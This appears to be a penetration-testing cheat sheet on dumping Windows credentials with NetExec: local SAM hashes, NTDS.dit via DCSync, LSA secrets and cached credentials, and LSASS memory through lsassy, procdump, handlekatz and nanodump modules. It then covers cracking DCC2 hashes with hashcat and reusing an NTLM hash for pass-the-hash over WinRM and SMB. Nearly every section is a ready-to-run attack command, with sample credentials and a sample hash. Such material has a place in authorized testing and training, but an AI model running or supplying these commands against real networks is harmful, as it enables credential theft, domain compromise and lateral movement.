# 06.07 Credential Dumping SAM NTDS LSA LSASS

> Drop SAM, NTDS.dit, LSA secrets, and LSASS memory with `nxc --sam/--ntds/--lsa` plus `lsassy/procdump/nanodump` modules.

## Overview

CME automates credential extraction at multiple layers: local SAM database (`--sam`), Active Directory NTDS.dit (`--ntds`), LSA secrets and cached credentials (`--lsa`), and LSASS process memory via multiple modules (lsassy, procdump, handlekatz, nanodump). All require local admin (Pwn3d!). NTDS requires DCSync or Domain Admin rights. Cached credentials ($DCC2$) crack with hashcat mode 2100.

## Steps

- `--sam` dumps local NTLM hashes for all local accounts; use for lateral movement with PTH.
- `--ntds` performs DCSync from a DC; `--ntds --user krbtgt` dumps only one account.
- `--ntds --enabled` filters to only enabled accounts on-screen.
- `--lsa` dumps LSA secrets including DCC2 cached credentials, DPAPI keys, and service account plaintext.
- Extract clean DCC2 hashes: `cat *.cached | cut -d ":" -f 2` then crack with `hashcat -m 2100`.
- LSASS modules (lsassy, procdump, handlekatz, nanodump) dump LSASS memory and parse with pypykatz.
- Use harvested hashes with `-H <NTLM>` for pass-the-hash across SMB, WinRM, RDP, LDAP, MSSQL.

## Commands

### Dump local SAM hashes

```bash
nxc smb <TARGET> -u robert -p '<PASS>' --sam
```

### Dump NTDS (DCSync)

```bash
proxychains4 -q nxc smb <TARGET> -u robert -p '<PASS>' --ntds
```

### Dump NTDS — single user (krbtgt)

```bash
proxychains4 -q nxc smb <TARGET> -u julio -p Password1 --ntds --user krbtgt
```

### Dump NTDS — enabled accounts only

```bash
proxychains4 -q nxc smb <TARGET> -u robert -p '<PASS>' --ntds --enabled
```

### Dump LSA secrets and cached credentials

```bash
nxc smb <TARGET> -u robert -p '<PASS>' --lsa
```

### Crack DCC2 cached credentials

```bash
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### LSASS dump with lsassy

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -M lsassy
```

### LSASS dump with procdump

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -M procdump
```

### LSASS dump with handlekatz

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -M handlekatz
```

### LSASS dump with nanodump

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -M nanodump
```

### Pass-the-hash with WinRM

```bash
nxc winrm <TARGET> -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth -x whoami
```

### Pass-the-hash relay result (local admin PTH)

```bash
proxychains4 -q nxc smb <TARGET> -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth
```
